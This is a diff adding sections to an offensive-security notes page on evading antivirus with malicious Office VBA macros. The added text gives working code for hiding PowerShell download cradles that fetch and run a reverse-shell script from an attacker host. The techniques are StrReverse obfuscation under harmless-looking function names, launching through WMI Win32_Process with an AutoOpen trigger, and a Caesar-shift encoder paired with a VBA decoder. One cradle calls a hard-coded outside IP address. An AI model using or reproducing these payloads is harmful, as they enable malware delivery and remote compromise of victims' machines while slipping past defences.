@@ -133,6 +133,22 @@ End If
 ...
 ```
 
+### Reverse string
+StrReverse() in VBA. Use on the sus parts of the code, like the PS download cradle or the payload in bytes
+
+However AV companies has noted the notorious use of this function in malware, and flags even clean code based on the number of StrReverse that it uses. As a result, minimise its use and use more innocent sounding variable names:
+```
+Function bears(cows)
+    bears = StrReverse(cows)
+End Function
+
+Sub Mymacro()
+Dim strArg As String
+strArg = bears("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")
+
+GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid
+End Sub
+```
 
 ### Stomping
 There is a cached version of VBA code in documents known as P-code. Its specific to the Microsoft product version so this method will only work for victims with the same version of the Microsoft product. You can evade AV by manually removing the actual VBA source code and relying entirely on the P-code to execute your shell.
@@ -145,3 +161,79 @@ There is a cached version of VBA code in documents known as P-code. Its specific
 5. Select the bytes starting from there until the end
 6. Edit > Insert Zero Block and accept everything
 
+### Hiding powershell download cradles
+
+#### Using WMI
+AV detects powershell running as a process under office product and flags it. Using this will make it run under Wmiprvse.exe instead.
+
+1. Use the .ps1 reverse shell [here](./Meterpreter#ps1-reverse-shell) (follow step 2 and 3)
+2.
+```
+Sub MyMacro
+  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://<kali ip>:<http port>/run.ps1'))"
+  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+End Sub
+
+Sub AutoOpen()
+    Mymacro
+End Sub
+```
+
+#### Caesar shifting the download cradle
+1. Use the .ps1 reverse shell [here](./Meterpreter#ps1-reverse-shell) (follow step 2 and 3)
+2. Run this in powershell:
+```powershell
+$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://<kali ip>:<http port>/run.ps1'))"
+
+[string]$output = ""
+
+$payload.ToCharArray() | %{
+    [string]$thischar = [byte][char]$_ + 17
+    if($thischar.Length -eq 1)
+    {
+        $thischar = [string]"00" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 2)
+    {
+        $thischar = [string]"0" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 3)
+    {
+        $output += $thischar
+    }
+}
+$output
+```
+3. Then this in VBA:
+```
+Function Pears(Beets)
+    Pears = Chr(Beets - 17)
+End Function
+
+Function Strawberries(Grapes)
+    Strawberries = Left(Grapes, 3)
+End Function
+
+Function Almonds(Jelly)
+    Almonds = Right(Jelly, Len(Jelly) - 3)
+End Function
+
+Function Nuts(Milk)
+    Do
+    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
+    Milk = Almonds(Milk)
+    Loop While Len(Milk) > 0
+    Nuts = Oatmilk
+End Function
+
+Function MyMacro()
+    Dim Apples As String
+    Dim Water As String
+    
+    Apples = "<output from 1>"
+    Water = Nuts(Apples)
+    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
+End Function
+```
